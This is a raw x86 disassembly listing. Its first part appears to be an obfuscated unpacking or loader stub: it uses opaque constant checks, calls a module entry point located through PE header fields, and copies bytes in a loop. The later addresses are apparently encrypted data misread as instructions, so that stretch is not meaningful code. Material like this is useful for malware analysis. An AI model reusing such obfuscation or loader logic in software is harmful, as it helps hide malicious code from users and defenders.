  42163b:	cmp    eax,0xf89c85a4
  421640:	je     0x42169f
  421646:	mov    eax,DWORD PTR [esp+0x20]
  42164a:	mov    ecx,DWORD PTR [esp+0x38]
  42164e:	xor    eax,esi
  421650:	add    eax,ebx
  421652:	cmp    eax,ecx
  421654:	je     0x42169f
  42165a:	mov    eax,ds:0x428373
  42165f:	mov    eax,DWORD PTR [eax+0x194]
  421665:	mov    ecx,DWORD PTR [eax]
  421667:	mov    eax,DWORD PTR [ecx+0x3c]
  42166a:	push   DWORD PTR ds:0x428453
  421670:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  421674:	push   DWORD PTR ds:0x4281f7
  42167a:	add    eax,ecx
  42167c:	mov    ecx,DWORD PTR ds:0x428373
  421682:	mov    ecx,DWORD PTR [ecx+0x194]
  421688:	push   DWORD PTR [ecx]
  42168a:	call   eax
  42168c:	mov    ecx,DWORD PTR ds:0x428373
  421692:	mov    ecx,DWORD PTR [ecx+0x1cc]
  421698:	mov    DWORD PTR [ecx],eax
  42169a:	jmp    0x421870
  42169f:	mov    eax,DWORD PTR [esp+0x20]
  4216a3:	mov    ecx,DWORD PTR [esp+0x40]
  4216a7:	xor    eax,esi
  4216a9:	add    eax,ebx
  4216ab:	cmp    eax,ecx
  4216ad:	jne    0x421718
  4216b3:	mov    eax,DWORD PTR [esp+0x20]
  4216b7:	mov    ecx,DWORD PTR ds:0x428373
  4216bd:	mov    ecx,DWORD PTR [ecx+0x198]
  4216c3:	xor    eax,esi
  4216c5:	add    eax,ebx
  4216c7:	cmp    eax,DWORD PTR [ecx]
  4216c9:	jne    0x4216f1
  4216cf:	mov    eax,DWORD PTR [esp+0x20]
  4216d3:	push   0xffffffff
  4216d5:	push   0x70941f91
  4216da:	xor    eax,esi
  4216dc:	add    eax,ebx
  4216de:	push   eax
  4216df:	push   0xf89c85a1
  4216e4:	push   DWORD PTR [esp+0x1c]
  4216e8:	push   DWORD PTR [esp+0x34]
  4216ec:	call   0x41b999
  4216f1:	push   DWORD PTR [esp+0xc]
  4216f5:	push   DWORD PTR [esp+0x24]
  4216f9:	call   0x401000
  4216fe:	mov    eax,DWORD PTR [esp+0x20]
  421702:	xor    eax,esi
  421704:	add    eax,ebx
  421706:	mov    ds:0x4283ff,eax
  42170b:	mov    eax,DWORD PTR [esp+0x20]
  42170f:	xor    eax,esi
  421711:	add    eax,ebx
  421713:	mov    ds:0x4283f7,eax
  421718:	mov    eax,DWORD PTR [esp+0x2c]
  42171c:	test   eax,eax
  42171e:	je     0x421870
  421724:	mov    DWORD PTR [esp+0x4c],0xf152c3c
  42172c:	mov    DWORD PTR [esp+0x54],0x712ed2f
  421734:	mov    DWORD PTR [esp+0x48],0x373fc0d
  42173c:	mov    DWORD PTR [esp+0x50],0x72670add
  421744:	call   0x41932f
  421749:	mov    eax,DWORD PTR [esp+0x34]
  42174d:	mov    eax,DWORD PTR [esp+0xc]
  421751:	mov    DWORD PTR [esp+0x30],eax
  421755:	mov    eax,DWORD PTR [esp+0x20]
  421759:	mov    DWORD PTR [esp+0xc],eax
  42175d:	mov    eax,eax
  42175f:	mov    eax,ds:0x428373
  421764:	mov    ecx,DWORD PTR [eax+0x1c0]
  42176a:	mov    edx,DWORD PTR [ecx]
  42176c:	and    DWORD PTR [esp+0x14],0x0
  421771:	mov    edi,0xfabdbed2
  421776:	add    edx,edi
  421778:	adc    DWORD PTR [esp+0x14],0xffffffff
  42177d:	mov    ecx,0x8a29a143
  421782:	xor    edx,ecx
  421784:	mov    DWORD PTR [esp+0x18],edx
  421788:	mov    edx,DWORD PTR [esp+0x14]
  42178c:	xor    edx,0x0
  42178f:	cmp    DWORD PTR [esp+0x18],0x70941f90
  421797:	mov    DWORD PTR [esp+0x1c],edx
  42179b:	jne    0x4217aa
  4217a1:	cmp    edx,0xffffffff
  4217a4:	je     0x421813
  4217aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4217b0:	mov    eax,DWORD PTR [eax]
  4217b2:	cdq    
  4217b3:	add    eax,edi
  4217b5:	adc    edx,0xffffffff
  4217b8:	and    DWORD PTR [esp+0x14],0x0
  4217bd:	xor    edx,0x0
  4217c0:	mov    DWORD PTR [esp+0x24],edx
  4217c4:	mov    edx,DWORD PTR [esp+0xc]
  4217c8:	mov    DWORD PTR [esp+0x10],edx
  4217cc:	xor    eax,ecx
  4217ce:	add    DWORD PTR [esp+0x10],edi
  4217d2:	mov    edx,DWORD PTR [esp+0x10]
  4217d6:	adc    DWORD PTR [esp+0x14],0xffffffff
  4217db:	xor    edx,ecx
  4217dd:	mov    DWORD PTR [esp+0x18],edx
  4217e1:	mov    edx,DWORD PTR [esp+0x14]
  4217e5:	xor    edx,0x0
  4217e8:	mov    DWORD PTR [esp+0x1c],edx
  4217ec:	cmp    DWORD PTR [esp+0x18],eax
  4217f0:	jne    0x421802
  4217f6:	mov    eax,DWORD PTR [esp+0x24]
  4217fa:	cmp    edx,eax
  4217fc:	je     0x421813
  421802:	mov    eax,DWORD PTR [esp+0xc]
  421806:	add    eax,DWORD PTR [esp+0x30]
  42180a:	mov    DWORD PTR [esp+0xc],eax
  42180e:	jmp    0x421870
  421813:	mov    eax,ds:0x4283f7
  421818:	mov    edx,DWORD PTR ds:0x4283ff
  42181e:	xor    eax,edx
  421820:	mov    ds:0x4283f7,eax
  421825:	mov    edx,DWORD PTR ds:0x4283f7
  42182b:	mov    eax,DWORD PTR [esp+0x2c]
  42182f:	add    DWORD PTR [eax],edx
  421831:	mov    edx,DWORD PTR [esp+0xc]
  421835:	mov    eax,ds:0x4283f7
  42183a:	xor    edx,esi
  42183c:	add    edx,ebx
  42183e:	xor    ebx,ebx
  421840:	add    edx,edi
  421842:	adc    ebx,0xffffffff
  421845:	xor    esi,esi
  421847:	xor    edx,ecx
  421849:	xor    ebx,0x0
  42184c:	add    eax,edi
  42184e:	adc    esi,0xffffffff
  421851:	xor    eax,ecx
  421853:	xor    esi,0x0
  421856:	cmp    eax,edx
  421858:	jne    0x421870
  42185e:	cmp    esi,ebx
  421860:	jne    0x421870
  421866:	mov    eax,ds:0x4283f7
  42186b:	mov    ds:0x4283ff,eax
  421870:	mov    eax,ds:0x428373
  421875:	push   0x4
  421877:	add    eax,0x1cc
  42187c:	push   eax
  42187d:	lea    eax,[esp+0x3c]
  421881:	push   eax
  421882:	call   0x421896
  421887:	mov    eax,DWORD PTR [esp+0x34]
  42188b:	mov    eax,DWORD PTR [eax]
  42188d:	pop    edi
  42188e:	pop    esi
  42188f:	pop    ebx
  421890:	mov    esp,ebp
  421892:	pop    ebp
  421893:	ret    0xc
  421896:	push   ebp
  421897:	mov    ebp,esp
  421899:	sub    esp,0x10
  42189c:	mov    eax,0xf89c85a5
  4218a1:	mov    DWORD PTR [ebp-0x4],eax
  4218a4:	mov    DWORD PTR ds:0x428ecb,0x1d
  4218ae:	cmp    DWORD PTR ds:0x428ecb,0x0
  4218b5:	je     0x421906
  4218bb:	cmp    DWORD PTR ds:0x428ecb,0x8
  4218c2:	jg     0x421906
  4218c8:	jmp    0x4218d8
  4218cd:	push   0x428e77
  4218d2:	call   DWORD PTR ds:0x42a9e7
  4218d8:	cmp    DWORD PTR ds:0x428ecb,0x9
  4218df:	jne    0x4218f2
  4218e5:	mov    edx,DWORD PTR ds:0x428ecb
  4218eb:	dec    edx
  4218ec:	mov    DWORD PTR ds:0x428ecb,edx
  4218f2:	xor    edx,edx
  4218f4:	add    edx,DWORD PTR ds:0x428ecb
  4218fa:	dec    edx
  4218fb:	mov    DWORD PTR ds:0x428ecb,edx
  421901:	jmp    0x4218ae
  421906:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  42190d:	xor    ecx,edx
  42190f:	mov    ecx,DWORD PTR [ebp-0x4]
  421912:	sbb    edx,0x5246
  421918:	push   esi
  421919:	or     DWORD PTR ds:0x428e5b,edi
  42191f:	mov    edx,0x75108af
  421924:	adc    DWORD PTR ds:0x428e43,0x2a82
  42192e:	xor    ecx,edx
  421930:	sbb    DWORD PTR ds:0x428e93,edi
  421936:	mov    esi,0x3272f6
  42193b:	push   edi
  42193c:	inc    DWORD PTR ds:0x428e47
  421942:	mov    edi,DWORD PTR [ebp+0x10]
  421945:	adc    DWORD PTR ds:0x428e43,0x428ecf
  42194f:	add    ecx,esi
  421951:	cmp    ecx,edi
  421953:	mov    DWORD PTR ds:0x428ea3,0x27d
  42195d:	je     0x421a9e
  421963:	mov    ecx,DWORD PTR ds:0x428e33
  421969:	or     DWORD PTR ds:0x428e2b,ecx
  42196f:	mov    ecx,DWORD PTR [ebp-0x4]
  421972:	mov    edi,DWORD PTR [ebp+0x10]
  421975:	xor    eax,eax
  421977:	xor    ecx,edx
  421979:	sub    DWORD PTR ds:0x428e2b,0x428e2f
  421983:	add    ecx,esi
  421985:	xor    DWORD PTR ds:0x428e6b,0x2e89
  42198f:	add    edi,0xfabdbed2
  421995:	mov    DWORD PTR ds:0x428e27,0xdb6
  42199f:	adc    eax,0xffffffff
  4219a2:	adc    DWORD PTR ds:0x428e23,0x428e77
  4219ac:	xor    eax,0x0
  4219af:	mov    DWORD PTR [ebp-0xc],eax
  4219b2:	push   ebx
  4219b3:	mov    eax,ds:0x428e37
  4219b8:	add    eax,DWORD PTR ds:0x428ebf
  4219be:	mov    ds:0x428e37,eax
  4219c3:	xor    ebx,ebx
  4219c5:	adc    DWORD PTR ds:0x428e4b,0x1a92
  4219cf:	xor    edi,0x8a29a143
  4219d5:	adc    eax,DWORD PTR ds:0x428e3b
  4219db:	mov    eax,ecx
  4219dd:	xor    DWORD PTR ds:0x428e4b,0x428e93
  4219e7:	add    eax,0xfabdbed2
  4219ec:	mov    DWORD PTR ds:0x428e2b,0x4aa
  4219f6:	adc    ebx,0xffffffff
  4219f9:	xor    eax,0x8a29a143
  4219fe:	and    DWORD PTR ds:0x428e9f,0x428e57
  421a08:	xor    ebx,0x0
  421a0b:	mov    DWORD PTR ds:0x428e3b,0x3b6d
  421a15:	cmp    eax,edi
  421a17:	jne    0x421a30
  421a1d:	cmp    ebx,DWORD PTR [ebp-0xc]
  421a20:	je     0x421a98
  421a26:	jmp    0x421a30
  421a2b:	mov    esi,0x3272f6
  421a30:	mov    eax,DWORD PTR [ebp-0x4]
  421a33:	mov    edi,DWORD PTR [ebp-0x8]
  421a36:	xor    edi,edx
  421a38:	add    edi,esi
  421a3a:	mov    esi,DWORD PTR [ebp+0x8]
  421a3d:	imul   edi,ecx
  421a40:	mov    ebx,DWORD PTR [ebp+0xc]
  421a43:	xor    eax,edx
  421a45:	add    eax,ecx
  421a47:	mov    al,BYTE PTR [ebx+eax*1+0x3272f6]
  421a4e:	mov    BYTE PTR [edi+esi*1],al
  421a51:	mov    eax,DWORD PTR [ebp-0x8]
  421a54:	mov    esi,DWORD PTR [ebp+0x10]
  421a57:	xor    eax,edx
  421a59:	xor    ebx,ebx
  421a5b:	add    esi,0xfabdbed2
  421a61:	adc    ebx,0xffffffff
  421a64:	lea    ecx,[ecx+eax*1+0x3272f6]
  421a6b:	xor    edi,edi
  421a6d:	xor    esi,0x8a29a143
  421a73:	xor    ebx,0x0
  421a76:	mov    eax,ecx
  421a78:	add    eax,0xfabdbed2
  421a7d:	adc    edi,0xffffffff
  421a80:	xor    eax,0x8a29a143
  421a85:	xor    edi,0x0
  421a88:	cmp    eax,esi
  421a8a:	jne    0x421a2b
  421a90:	cmp    edi,ebx
  421a92:	jne    0x421a2b
  421a98:	mov    eax,0xf89c85a4
  421a9d:	pop    ebx
  421a9e:	pop    edi
  421a9f:	pop    esi
  421aa0:	leave  
  421aa1:	ret    0xc
  421aa4:	push   ebp
  421aa5:	mov    ebp,esp
  421aa7:	push   ecx
  421aa8:	dec    eax
  421aa9:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  421ab0:	mov    ecx,DWORD PTR ds:0x428ea7
  421ab6:	sub    DWORD PTR ds:0x428e93,ecx
  421abc:	jmp    0x423e02
  421ac1:	loope  0x421acb
  421ac3:	jg     0x421b24
  421ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ac6:	add    al,0xe1
  421ac8:	test   BYTE PTR [ecx+0x5bd524a],al
  421ace:	rcr    DWORD PTR [edx],1
  421ad0:	sbb    ch,BYTE PTR [edi-0x4a]
  421ad3:	add    BYTE PTR [ebx-0x7c7c9fa6],0xb4
  421ada:	sub    BYTE PTR [esi-0x5],ah
  421add:	inc    esp
  421ade:	cs ret 
  421ae0:	ret    
  421ae1:	jmp    0x421b06
  421ae3:	sbb    eax,0xbb0a1d94
  421ae8:	mov    ch,0x2
  421aea:	mov    ah,0xaf
  421aec:	inc    esi
  421aed:	mov    dl,0xd6
  421aef:	lods   eax,DWORD PTR ds:[esi]
  421af0:	sub    edi,DWORD PTR [edi]
  421af2:	mov    esp,0xd2047338
  421af7:	test   DWORD PTR [eax],ecx
  421af9:	rcl    edi,0xd3
  421afc:	mov    ds:0x9c920c29,eax
  421b01:	in     al,dx
  421b02:	repnz (bad) 
  421b04:	mov    cl,0x3e
  421b06:	in     al,0xac
  421b08:	aam    0x77
  421b0a:	mov    ds:0x66c79c6f,al
  421b0f:	mov    cl,0x7d
  421b11:	cmp    eax,0xdd23710c
  421b16:	or     bl,dl
  421b18:	in     al,0x92
  421b1a:	mov    ebp,0xc1130a7c
  421b1f:	(bad)  
  421b20:	jb     0x421b5c
  421b22:	add    DWORD PTR [eax],ecx
  421b24:	mov    ebp,0x6411c137
  421b29:	jb     0x421af2
  421b2b:	test   al,0x84
  421b2d:	in     eax,dx
  421b2e:	xor    DWORD PTR [edx+0x2c0858c4],edx
  421b34:	cwde   
  421b35:	mov    esp,0xd3015958
  421b3a:	dec    eax
  421b3b:	neg    edi
  421b3d:	inc    edx
  421b3e:	mov    al,ds:0x75fab9b2
  421b43:	dec    esp
  421b44:	dec    edx
  421b45:	pop    edi
  421b46:	ret    0xbbf5
  421b49:	xchg   edi,eax
  421b4a:	scas   eax,DWORD PTR es:[edi]
  421b4b:	push   ss
  421b4c:	mov    al,0x7d
  421b4e:	mov    ebp,0x37b2e11c
  421b53:	jle    0x421ada
  421b55:	cmp    eax,0xd473293c
  421b5a:	jnp    0x421b66
  421b5c:	add    eax,DWORD PTR [edx]
  421b5e:	rcl    DWORD PTR ss:[edi],cl
  421b61:	cs push edi
  421b63:	inc    esi
  421b64:	imul   ebp,DWORD PTR [eax],0x94bc9e61
  421b6a:	dec    ebx
  421b6b:	jg     0x421b9b
  421b6d:	cmp    DWORD PTR [eax],0xfffffffe
  421b70:	jge    0x421b2a
  421b72:	pop    esp
  421b73:	call   0xdaaa:0xa7e6bbac
  421b7a:	cmp    ebx,ecx
  421b7c:	pop    esi
  421b7d:	jecxz  0x421bb2
  421b7f:	sub    BYTE PTR [ebp+0x68],dh
  421b82:	push   ds
  421b83:	sbb    esp,eax
  421b85:	pushf  
  421b86:	aam    0xcf
  421b88:	leave  
  421b89:	pushf  
  421b8a:	icebp  
  421b8b:	shl    DWORD PTR [edx+0x4b],cl
  421b8e:	sbb    DWORD PTR [esi],eax
  421b90:	clc    
  421b91:	mov    dh,0x1
  421b93:	jmp    0xeb31:0xb7ebcc31
  421b9a:	jmp    0x421b38
  421b9c:	daa    
  421b9d:	dec    eax
  421b9e:	mov    BYTE PTR [esi-0x4],cl
  421ba1:	into   
  421ba2:	jns    0x421b5a
  421ba4:	push   0xd79f59fc
  421ba9:	jp     0x421b9c
  421bab:	call   0xff44cb06
  421bb0:	es jp  0x421b4d
  421bb3:	pop    ss
  421bb4:	test   al,0x51
  421bb6:	inc    ebx
  421bb7:	lock xchg BYTE PTR [ebp-0x641d3a10],bl
  421bbe:	rcr    DWORD PTR [esi+ebp*4-0x4d],1
  421bc2:	cmp    eax,0xaa337691
  421bc7:	jns    0x421ba2
  421bc9:	add    bh,dl
  421bcb:	imul   ebp,ebx,0xffffffee
  421bce:	je     0x421c34
  421bd0:	fwait
  421bd1:	push   edx
  421bd2:	(bad)  
  421bd4:	out    0x28,al
  421bd6:	nop
  421bd7:	cmp    DWORD PTR [eax+0x37fa2aa],0x34aed9ad
  421be1:	cli    
  421be2:	sub    BYTE PTR [ebx+0x35],dl
  421be5:	mov    dl,0x8c
  421be7:	pop    eax
  421be8:	inc    eax
  421be9:	jg     0x421bd8
  421beb:	je     0x421c5c
  421bed:	jnp    0x421bef
  421bef:	(bad)  
  421bf0:	mov    ch,0xd8
  421bf2:	addr16 jg 0x421c5c
  421bf5:	in     eax,0xa1
  421bf7:	sub    esi,DWORD PTR [edi+edi*2-0x68]
  421bfb:	in     eax,0x9
  421bfd:	rcl    BYTE PTR [ecx-0x42d8b4a8],1
  421c03:	dec    ebp
  421c04:	add    ebx,DWORD PTR [esi+0x67]
  421c07:	(bad)  
  421c08:	fld    DWORD PTR [eax+0x65]
  421c0b:	mov    bl,0x94
  421c0d:	clc    
  421c0e:	adc    eax,0x8c9d12df
  421c13:	cmp    DWORD PTR [esi-0x6cca8c9c],esp
  421c19:	xchg   esp,eax
  421c1a:	jb     0x421bfb
  421c1c:	in     al,dx
  421c1d:	or     DWORD PTR [ebp+0x7b3612f9],0xffe7d64a
  421c27:	sub    ebp,DWORD PTR [esp+ebp*1-0x6319477f]
  421c2e:	test   BYTE PTR [edi-0x68],ah
  421c31:	test   BYTE PTR [ecx+0x565821],dl
  421c37:	fmul   QWORD PTR [ebx+0x71]
  421c3a:	inc    ecx
  421c3b:	or     DWORD PTR [edx],ebx
  421c3d:	sub    bl,BYTE PTR [eax+0xf55a636]
  421c43:	adc    DWORD PTR [esi+ecx*2+0x34],ebp
  421c47:	adc    al,0x1e
  421c49:	(bad)  
  421c4a:	neg    BYTE PTR [esi+0x16b0b1bb]
  421c50:	frstor [ebx+eiz*1-0x68]
  421c54:	push   0x9386a2a7
  421c59:	in     eax,0xf5
  421c5b:	jb     0x421bf4
  421c5d:	and    DWORD PTR [ebp-0x61],eax
  421c60:	xor    ebx,DWORD PTR [ecx]
  421c62:	mov    edi,0x93eebda
  421c67:	sbb    eax,DWORD PTR [ecx]
  421c69:	lods   eax,DWORD PTR ds:[esi]
  421c6a:	and    DWORD PTR [eax+0x4c],0xdb03076f
  421c71:	add    eax,0xb8b1abff
  421c76:	out    0xa,eax
  421c78:	or     BYTE PTR [edx+edx*2+0x29],bh
  421c7c:	js     0x421c85
  421c7e:	out    dx,eax
  421c7f:	pusha  
  421c80:	shl    BYTE PTR [eax+0x1c84d136],1
  421c86:	xchg   esp,eax
  421c87:	push   eax
  421c88:	ins    BYTE PTR es:[edi],dx
  421c89:	mov    ecx,0xf4bff786
  421c8e:	add    eax,0x3f8a5cd2
  421c93:	mov    edi,0xed326c49
  421c98:	xchg   edi,eax
  421c99:	and    edi,ebp
  421c9b:	retf   
  421c9c:	test   BYTE PTR [esp+esi*8+0x0],bh
  421ca0:	dec    ebp
  421ca1:	sbb    BYTE PTR [edi+edx*4+0x4f4d4573],al
  421ca8:	ror    bl,cl
  421caa:	dec    edx
  421cab:	inc    esp
  421cac:	xor    edi,DWORD PTR ds:0x2b43afaf
  421cb2:	xor    DWORD PTR [ebx-0x4ce37155],ecx
  421cb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cb9:	mov    ecx,0x58950a77
  421cbe:	pushf  
  421cbf:	mov    bh,0x79
  421cc1:	mov    ds:0x6dbf6bb3,al
  421cc6:	xchg   esp,eax
  421cc7:	jb     0x421c85
  421cc9:	adc    al,0x2c
  421ccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ccc:	(bad)  
  421ccd:	bound  ebp,QWORD PTR [ebx+0x23]
  421cd0:	cmp    ah,BYTE PTR [ebp-0x45]
  421cd3:	je     0x421c73
  421cd5:	daa    
  421cd6:	ret    
  421cd7:	mov    bl,0x6b
  421cd9:	fcom   DWORD PTR [eax-0x8]
  421cdc:	(bad)  
  421cde:	push   eax
  421cdf:	popf   
  421ce0:	mov    cl,0x5d
  421ce2:	je     0x421d4c
  421ce4:	push   esp
  421ce5:	adc    eax,0x318f9aa1
  421cea:	fstp   TBYTE PTR ds:0xef003358
  421cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cf1:	nop
  421cf2:	pop    ebx
  421cf3:	add    eax,0x520e97c8
  421cf8:	(bad)  
  421cf9:	arpl   WORD PTR [eax+0x67e943f9],bx
  421cff:	das    
  421d00:	mov    ecx,0x986f80e6
  421d05:	sbb    cl,BYTE PTR [eax+0x705b39a5]
  421d0b:	xor    dh,BYTE PTR [ebp-0x24ef57bf]
  421d11:	xchg   ch,ch
  421d13:	sub    al,0x4c
  421d15:	push   edi
  421d16:	xchg   DWORD PTR [edi+0x78fdc33f],eax
  421d1c:	sbb    eax,ebx
  421d1e:	das    
  421d1f:	mov    ds:0xa4269ed0,al
  421d24:	mov    al,ds:0xb826cb6b
  421d29:	mov    ss,WORD PTR ds:0x55d5441a
  421d2f:	repz xlat BYTE PTR ds:[ebx]
  421d31:	nop
  421d32:	gs xchg ecx,eax
  421d34:	xor    al,0x3d
  421d36:	ret    
  421d37:	push   eax
  421d38:	inc    ebp
  421d39:	pop    ds
  421d3a:	stos   BYTE PTR es:[edi],al
  421d3b:	adc    edx,0x4b
  421d3e:	(bad)  
  421d3f:	icebp  
  421d40:	repnz push 0xa4d85e99
  421d46:	mov    DWORD PTR [edi],ebx
  421d48:	lods   eax,DWORD PTR ds:[esi]
  421d49:	sub    eax,0xe5081d73
  421d4e:	sbb    eax,0x69dcb529
  421d53:	dec    esi
  421d54:	sbb    DWORD PTR [eax+eax*1+0x8],esi
  421d58:	mov    eax,0x6f0928aa
  421d5d:	fadd   DWORD PTR [edi]
  421d5f:	cmc    
  421d60:	pop    ebx
  421d61:	rcr    BYTE PTR [esi+0x5887293f],1
  421d67:	push   esi
  421d68:	lods   eax,DWORD PTR ds:[esi]
  421d69:	inc    ebx
  421d6a:	pop    esp
  421d6b:	xor    eax,0xe34c0386
  421d70:	popa   
  421d71:	xchg   ebp,eax
  421d72:	dec    edi
  421d73:	jae    0x421d57
  421d75:	fst    st(6)
  421d77:	or     bl,ah
  421d79:	push   cs
  421d7a:	retf   
  421d7b:	shl    dl,cl
  421d7d:	xchg   ecx,eax
  421d7e:	rol    DWORD PTR [edi+eiz*1-0x2b],1
  421d82:	mov    ds:0xffe730c6,al
  421d87:	push   esi
  421d88:	test   eax,0xaf41fced
  421d8d:	xchg   edi,eax
  421d8e:	adc    DWORD PTR [ebp-0x1c91c91a],ebp
  421d94:	out    dx,al
  421d95:	jo     0x421d3b
  421d97:	or     esp,DWORD PTR [eax*8+0x6d4a1abb]
  421d9e:	push   ss
  421d9f:	je     0x421d8f
  421da1:	ror    DWORD PTR [edx+0x13620554],cl
  421da7:	arpl   WORD PTR [edx-0x6f7ea012],cx
  421dad:	xchg   edi,eax
  421dae:	iret   
  421daf:	mov    eax,ds:0x186fce6
  421db4:	shl    bl,cl
  421db6:	dec    edx
  421db7:	(bad)  
  421db8:	outs   dx,BYTE PTR ds:[esi]
  421db9:	jp     0x421dea
  421dbb:	shr    DWORD PTR cs:[ebx+esi*2+0x12],1
  421dc0:	jp     0x421dbf
  421dc2:	cdq    
  421dc3:	xchg   edx,eax
  421dc4:	jmp    0x6445c4f5
  421dc9:	lods   al,BYTE PTR ds:[esi]
  421dca:	arpl   WORD PTR [edi+0x4eca8ca4],sp
  421dd0:	js     0x421e10
  421dd2:	sub    ebp,DWORD PTR [edx+0x4f9bfab6]
  421dd8:	xor    DWORD PTR [edi+0x51e9bccc],eax
  421dde:	ret    0xbc03
  421de1:	es call 0x68a369ef
  421de7:	push   eax
  421de8:	neg    BYTE PTR [ebx]
  421dea:	out    dx,al
  421deb:	imul   eax,DWORD PTR [edi],0x48
  421dee:	jle    0x421e6e
  421df0:	ror    BYTE PTR ds:0x1d926ac3,1
  421df6:	(bad)  
  421df7:	jecxz  0x421e59
  421df9:	or     ch,dh
  421dfb:	mov    ebp,0x4863ada9
  421e00:	fs dec edx
  421e02:	inc    DWORD PTR [edi]
  421e04:	dec    edx
  421e05:	push   edi
  421e06:	retf   
  421e07:	std    
  421e08:	mov    ds:0x7c2c6c20,al
  421e0d:	push   esp
  421e0e:	xchg   BYTE PTR [esi+0x34],ch
  421e11:	or     al,0xc6
  421e13:	ret    0x52b4
  421e16:	xlat   BYTE PTR ds:[ebx]
  421e17:	inc    esi
  421e18:	xor    al,0xa2
  421e1a:	sbb    DWORD PTR [ecx],esi
  421e1c:	adc    al,0xbc
  421e1e:	or     dl,cl
  421e20:	xchg   DWORD PTR [edi],ebp
  421e22:	mov    dh,0x84
  421e24:	cmp    DWORD PTR [esi-0x9],eax
  421e27:	in     eax,0xd8
  421e29:	xor    eax,0xea834321
  421e2e:	and    dh,BYTE PTR [esi]
  421e30:	sar    ah,1
  421e32:	arpl   sp,ax
  421e34:	inc    esi
  421e35:	(bad)  
  421e36:	dec    ecx
  421e37:	sbb    BYTE PTR [eax+0x32],dh
  421e3a:	sbb    ebp,eax
  421e3c:	es and eax,0xdb70c248
  421e42:	shr    DWORD PTR ds:[ecx],1
  421e45:	std    
  421e46:	pop    esp
  421e47:	je     0x421e18
  421e49:	mov    al,ds:0x3b66ab63
  421e4e:	into   
  421e4f:	mov    ch,0xb0
  421e51:	jmp    DWORD PTR [ecx+0xc16b6a2]
  421e57:	pop    esp
  421e58:	loop   0x421e51
  421e5a:	call   0xfb97:0xd16ecf94
  421e61:	mov    eax,0xff39f8ba
  421e66:	inc    eax
  421e67:	leave  
  421e68:	loop   0x421e47
  421e6a:	enter  0x9353,0xa5
  421e6e:	mov    dh,0xc8
  421e70:	in     eax,0x56
  421e72:	jbe    0x421e93
  421e74:	fcomp  QWORD PTR [eax-0x74e3b2f8]
  421e7a:	xchg   ecx,eax
  421e7b:	mov    al,ds:0x41304e34
  421e80:	pusha  
  421e81:	fistp  WORD PTR [edx+0x2d]
  421e84:	nop
  421e85:	or     eax,0x9ac65d3
  421e8a:	xchg   ebx,eax
  421e8b:	mov    eax,0x923f5c0c
  421e90:	jbe    0x421ed9
  421e92:	gs daa 
  421e94:	adc    cl,ch
  421e96:	and    al,0xf1
  421e98:	push   0x34adef97
  421e9d:	sbb    BYTE PTR [esi-0x13],bh
  421ea0:	stos   DWORD PTR es:[edi],eax
  421ea1:	pop    es
  421ea2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ea3:	sbb    BYTE PTR [eax+0x5a],al
  421ea6:	or     BYTE PTR [ebx+ebp*4],dh
  421ea9:	mov    ?,WORD PTR [ebx]
  421eab:	hlt    
  421eac:	and    edx,DWORD PTR [eax+esi*8]
  421eaf:	jae    0x421eb5
  421eb1:	fisub  WORD PTR [esi-0x66879e31]
  421eb7:	inc    ebp
  421eb8:	inc    esp
  421eb9:	adc    ch,al
  421ebb:	retf   
  421ebc:	or     ch,cl
  421ebe:	xchg   eax,edi
  421ec0:	xor    eax,0x6903cd78
  421ec5:	dec    esi
  421ec6:	jmp    0x437f66a2
  421ecb:	das    
  421ecc:	pop    es
  421ecd:	mov    esi,0x6e767ce8
  421ed2:	add    ebx,eax
  421ed4:	xchg   esp,eax
  421ed5:	inc    edx
  421ed6:	out    0x3c,al
  421ed8:	jae    0x421e7c
  421eda:	ja     0x421edb
  421edc:	fucomi st,st(5)
  421ede:	or     bh,cl
  421ee0:	loope  0x421ea5
  421ee2:	jnp    0x421e67
  421ee4:	inc    ecx
  421ee5:	or     al,0xc9
  421ee7:	dec    ecx
  421ee8:	enter  0xa348,0xa1
  421eec:	jg     0x421f27
  421eee:	aas    
  421eef:	nop
  421ef0:	sbb    esp,edi
  421ef2:	adc    esp,DWORD PTR [ebp-0x6574fa70]
  421ef8:	lds    ebp,FWORD PTR [edi]
  421efa:	xor    edi,DWORD PTR [edx]
  421efc:	mov    al,0xfa
  421efe:	lock stos BYTE PTR es:[edi],al
  421f00:	cdq    
  421f01:	push   es
  421f02:	(bad)  
  421f03:	call   0x423e5aca
  421f08:	test   dl,0x12
  421f0b:	pop    edx
  421f0c:	imul   ebx,DWORD PTR [eax],0xfffffff5
  421f0f:	ret    
  421f10:	push   0x2b
  421f12:	ret    
  421f13:	clc    
  421f14:	in     al,0x10
  421f16:	stos   BYTE PTR es:[edi],al
  421f17:	ins    BYTE PTR es:[edi],dx
  421f18:	xchg   DWORD PTR [edx-0x70],eax
  421f1b:	ins    BYTE PTR es:[edi],dx
  421f1c:	stos   BYTE PTR es:[edi],al
  421f1d:	pop    es
  421f1e:	inc    ecx
  421f1f:	adc    eax,0x1d1f5e3
  421f24:	fbstp  TBYTE PTR [ebx]
  421f26:	(bad)  [edx+0x61]
  421f29:	mov    dl,0xa4
  421f2b:	jp     0x421f03
  421f2d:	fimul  WORD PTR [edx-0x780d1bc9]
  421f33:	pop    edi
  421f34:	jnp    0x421f27
  421f36:	add    al,0xb8
  421f38:	cwde   
  421f39:	fwait
  421f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f3b:	imul   ebx,DWORD PTR [ebx],0xfffffffa
  421f3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f3f:	dec    BYTE PTR [edi+0x2f]
  421f42:	imul   edi,DWORD PTR [ecx+eiz*4],0xffffff9e
  421f46:	mov    cl,0xad
  421f48:	(bad)  
  421f49:	ror    BYTE PTR [edi],1
  421f4b:	in     al,dx
  421f4c:	sbb    DWORD PTR [ecx+ebx*2],ecx
  421f4f:	mov    ds:0xd0ac856b,eax
  421f54:	cmc    
  421f55:	xchg   ecx,eax
  421f56:	out    0x2,al
  421f58:	mov    dl,0xb3
  421f5a:	jl     0x421f12
  421f5c:	cmc    
  421f5d:	(bad)  
